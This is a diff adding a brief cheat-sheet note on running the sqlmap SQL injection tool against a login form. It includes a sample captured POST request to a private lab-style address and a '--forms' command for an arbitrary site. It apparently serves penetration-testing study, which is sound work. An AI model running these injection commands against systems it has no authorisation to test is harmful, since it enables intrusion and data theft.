@@ -1,0 +1,22 @@
+
+# to sqlmap with POST method using file
+sqlmap -r post2.txt -u http://10.10.10.100/login.php -p email
+
+# sample post2.txt:
+
+POST /login.php HTTP/1.1
+Host: 10.10.10.100
+User-Agent: Mozilla/5.0 (X11; Linux i686; rv:45.0) Gecko/20100101 Firefox/45.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://10.10.10.100/login.php
+Cookie: PHPSESSID=24rds3v3o3l6dp421d6e684io5
+Connection: close
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 55
+
+email=aa%40co.com&pass=qqqq&submit=Login&submitted=TRUE
+
+# to sqlmap with POST method
+sqlmap --forms -u <site>
